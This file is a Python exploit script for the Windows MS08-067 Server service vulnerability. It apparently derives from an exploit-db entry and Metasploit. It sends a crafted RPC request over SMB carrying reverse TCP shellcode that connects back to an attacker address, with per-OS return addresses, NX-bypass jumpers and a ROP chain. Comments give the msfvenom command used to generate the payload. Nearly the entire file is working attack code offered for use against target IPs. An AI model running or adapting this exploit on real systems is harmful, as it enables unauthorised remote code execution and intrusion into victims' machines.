import struct
import time
import sys


from threading import Thread    #Thread is imported incase you would like to modify


try:

    from impacket import smb

    from impacket import uuid

    from impacket import dcerpc

    from impacket.dcerpc.v5 import transport


except ImportError, _:

    print 'Install the following library to make this script work'

    print 'Impacket : http://oss.coresecurity.com/projects/impacket.html'

    print 'PyCrypto : http://www.amk.ca/python/code/crypto.html'

    sys.exit(1)


print '#######################################################################'

print '#   MS08-067 Exploit'

print '#   This is a modified verion of Debasis Mohanty\'s code (https://www.exploit-db.com/exploits/7132/).'

print '#   The return addresses and the ROP parts are ported from metasploit module exploit/windows/smb/ms08_067_netapi'

print '#######################################################################\n'


#Reverse TCP shellcode from metasploit; port 443 IP 192.168.40.103; badchars \x00\x0a\x0d\x5c\x5f\x2f\x2e\x40;
#Make sure there are enough nops at the begining for the decoder to work. Payload size: 380 bytes (nopsleps are not included)
#EXITFUNC=thread Important!

#venom -p windows/shell/reverse_tcp LHOST=10.11.0.131 LPORT=4444  EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f python
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
shellcode+="\x90\x90\x90\x90\x90"
shellcode += "\x31\xc9\x83\xe9\xa5\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shellcode += "\x76\x0e\xeb\x7a\x94\xf6\x83\xee\xfc\xe2\xf4\x17\x92"
shellcode += "\x16\xf6\xeb\x7a\xf4\x7f\x0e\x4b\x54\x92\x60\x2a\xa4"
shellcode += "\x7d\xb9\x76\x1f\xa4\xff\xf1\xe6\xde\xe4\xcd\xde\xd0"
shellcode += "\xda\x85\x38\xca\x8a\x06\x96\xda\xcb\xbb\x5b\xfb\xea"
shellcode += "\xbd\x76\x04\xb9\x2d\x1f\xa4\xfb\xf1\xde\xca\x60\x36"
shellcode += "\x85\x8e\x08\x32\x95\x27\xba\xf1\xcd\xd6\xea\xa9\x1f"
shellcode += "\xbf\xf3\x99\xae\xbf\x60\x4e\x1f\xf7\x3d\x4b\x6b\x5a"
shellcode += "\x2a\xb5\x99\xf7\x2c\x42\x74\x83\x1d\x79\xe9\x0e\xd0"
shellcode += "\x07\xb0\x83\x0f\x22\x1f\xae\xcf\x7b\x47\x90\x60\x76"
shellcode += "\xdf\x7d\xb3\x66\x95\x25\x60\x7e\x1f\xf7\x3b\xf3\xd0"
shellcode += "\xd2\xcf\x21\xcf\x97\xb2\x20\xc5\x09\x0b\x25\xcb\xac"
shellcode += "\x60\x68\x7f\x7b\xb6\x12\xa7\xc4\xeb\x7a\xfc\x81\x98"
shellcode += "\x48\xcb\xa2\x83\x36\xe3\xd0\xec\xf3\x7c\x09\x3b\xc2"
shellcode += "\x04\xf7\xeb\x7a\xbd\x32\xbf\x2a\xfc\xdf\x6b\x11\x94"
shellcode += "\x09\x3e\x10\x9e\x9e\xe1\x71\x94\x75\x83\x78\x94\xe7"
shellcode += "\xb7\xf3\x72\xa6\xbb\x2a\xc4\xb6\xbb\x3a\xc4\x9e\x01"
shellcode += "\x75\x4b\x16\x14\xaf\x03\x9c\xfb\x2c\xc3\x9e\x72\xdf"
shellcode += "\xe0\x97\x14\xaf\x11\x36\x9f\x70\x6b\xb8\xe3\x0f\x78"
shellcode += "\x1e\x8c\x7a\x94\xf6\x81\x7a\xfe\xf2\xbd\x2d\xfc\xf4"
shellcode += "\x32\xb2\xcb\x09\x3e\xf9\x6c\xf6\x95\x4c\x1f\xc0\x81"
shellcode += "\x3a\xfc\xf6\xfb\x7a\x94\xa0\x81\x7a\xfc\xae\x4f\x29"
shellcode += "\x71\x09\x3e\xe9\xc7\x9c\xeb\x2c\xc7\xa1\x83\x78\x4d"
shellcode += "\x3e\xb4\x85\x41\x75\x13\x7a\xe9\xde\xb3\x12\x94\xb6"
shellcode += "\xeb\x7a\xfe\xf6\xbb\x12\x9f\xd9\xe4\x4a\x6b\x23\xbc"
shellcode += "\x12\xe1\x98\xa6\x1b\x6b\x23\xb5\x24\x6b\xfa\xcf\x75"
shellcode += "\x11\x86\x14\x85\x6b\x1f\x70\x85\x6b\x09\xea\xb9\xbd"
shellcode += "\x30\x9e\xbb\x57\x4d\x0b\x67\xbe\xfc\x83\xdc\x01\x4b"
shellcode += "\x76\x85\x41\xca\xed\x06\x9e\x76\x10\x9a\xe1\xf3\x50"
shellcode += "\x3d\x87\x84\x84\x10\x94\xa5\x14\xaf\x94\xf6"


nonxjmper = "\x08\x04\x02\x00%s"+"A"*4+"%s"+"A"*42+"\x90"*8+"\xeb\x62"+"A"*10
disableNXjumper = "\x08\x04\x02\x00%s%s%s"+"A"*28+"%s"+"\xeb\x02"+"\x90"*2+"\xeb\x62"
ropjumper = "\x00\x08\x01\x00"+"%s"+"\x10\x01\x04\x01";
module_base = 0x6f880000
def generate_rop(rvas):
	gadget1="\x90\x5a\x59\xc3"
	gadget2 = ["\x90\x89\xc7\x83", "\xc7\x0c\x6a\x7f", "\x59\xf2\xa5\x90"]	
	gadget3="\xcc\x90\xeb\x5a"	
	ret=struct.pack('<L', 0x00018000)
	ret+=struct.pack('<L', rvas['call_HeapCreate']+module_base)
	ret+=struct.pack('<L', 0x01040110)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', 0x01010101)
	ret+=struct.pack('<L', rvas['add eax, ebp / mov ecx, 0x59ffffa8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget1
	ret+=struct.pack('<L', rvas['mov [eax], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget2[0]
	ret+=gadget2[1]
	ret+=struct.pack('<L', rvas['mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['pop ecx / ret']+module_base)
	ret+=gadget2[2]
	ret+=struct.pack('<L', rvas['mov [eax+0x10], ecx / ret']+module_base)
	ret+=struct.pack('<L', rvas['add eax, 8 / ret']+module_base)
	ret+=struct.pack('<L', rvas['jmp eax']+module_base)
	ret+=gadget3	
	return ret
class SRVSVC_Exploit(Thread):

    def __init__(self, target, os, port=445):

        super(SRVSVC_Exploit, self).__init__()

        self.__port   = port

        self.target   = target
	self.os	      = os

    def __DCEPacket(self):
	if (self.os=='1'):
		print 'Windows XP SP0/SP1 Universal\n'
		ret = "\x61\x13\x00\x01"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='2'):
		print 'Windows 2000 Universal\n'
		ret = "\xb0\x1c\x1f\x00"
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='3'):
		print 'Windows 2003 SP0 Universal\n'
		ret = "\x9e\x12\x00\x01"  #0x01 00 12 9e
		jumper = nonxjmper % (ret, ret)
	elif (self.os=='4'):
		print 'Windows 2003 SP1 English\n'
		ret_dec = "\x8c\x56\x90\x7c"  #0x7c 90 56 8c dec ESI, ret @SHELL32.DLL
		ret_pop = "\xf4\x7c\xa2\x7c"  #0x 7c a2 7c f4 push ESI, pop EBP, ret @SHELL32.DLL
		jmp_esp = "\xd3\xfe\x86\x7c" #0x 7c 86 fe d3 jmp ESP @NTDLL.DLL
		disable_nx = "\x13\xe4\x83\x7c" #0x 7c 83 e4 13 NX disable @NTDLL.DLL
		jumper = disableNXjumper % (ret_dec*6, ret_pop, disable_nx, jmp_esp*2)
	elif (self.os=='5'):
		print 'Windows XP SP3 French (NX)\n'
		ret = "\x07\xf8\x5b\x59"  #0x59 5b f8 07 
		disable_nx = "\xc2\x17\x5c\x59" #0x59 5c 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='6'):
		print 'Windows XP SP3 English (NX)\n'
		ret = "\x07\xf8\x88\x6f"  #0x6f 88 f8 07 
		disable_nx = "\xc2\x17\x89\x6f" #0x6f 89 17 c2 
		jumper = nonxjmper % (disable_nx, ret)  #the nonxjmper also work in this case.
	elif (self.os=='7'):
		print 'Windows XP SP3 English (AlwaysOn NX)\n'
		rvasets = {'call_HeapCreate': 0x21286,'add eax, ebp / mov ecx, 0x59ffffa8 / ret' : 0x2e796,'pop ecx / ret':0x2e796 + 6,'mov [eax], ecx / ret':0xd296,'jmp eax':0x19c6f,'mov [eax+8], edx / mov [eax+0xc], ecx / mov [eax+0x10], ecx / ret':0x10a56,'mov [eax+0x10], ecx / ret':0x10a56 + 6,'add eax, 8 / ret':0x29c64}
		jumper = generate_rop(rvasets)+"AB"  #the nonxjmper also work in this case.
	else:
		print 'Not supported OS version\n'
		sys.exit(-1)
	print '[-]Initiating connection'

        self.__trans = transport.DCERPCTransportFactory('ncacn_np:%s[\\pipe\\browser]' % self.target)

        self.__trans.connect()

        print '[-]connected to ncacn_np:%s[\\pipe\\browser]' % self.target

        self.__dce = self.__trans.DCERPC_class(self.__trans)

        self.__dce.bind(uuid.uuidtup_to_bin(('4b324fc8-1670-01d3-1278-5a47bf6ee188', '3.0')))

        path ="\x5c\x00"+"ABCDEFGHIJ"*10 + shellcode +"\x5c\x00\x2e\x00\x2e\x00\x5c\x00\x2e\x00\x2e\x00\x5c\x00" + "\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00"  + jumper + "\x00" * 2

        server="\xde\xa4\x98\xc5\x08\x00\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00\x41\x00\x42\x00\x43\x00\x44\x00\x45\x00\x46\x00\x47\x00\x00\x00"
        prefix="\x02\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x5c\x00\x00\x00"

        self.__stub=server+"\x36\x01\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00" + path +"\xE8\x03\x00\x00"+prefix+"\x01\x10\x00\x00\x00\x00\x00\x00"

        return



    def run(self):

        self.__DCEPacket()

        self.__dce.call(0x1f, self.__stub) 
        time.sleep(5)
        print 'Exploit finish\n'



if __name__ == '__main__':

       try:

           target = sys.argv[1]
	   os = sys.argv[2]

       except IndexError:

	print '\nUsage: %s <target ip>\n' % sys.argv[0]

	print 'Example: MS08_067.py 192.168.1.1 1 for Windows XP SP0/SP1 Universal\n'
	print 'Example: MS08_067.py 192.168.1.1 2 for Windows 2000 Universal\n'

	sys.exit(-1)



current = SRVSVC_Exploit(target, os)

current.start()
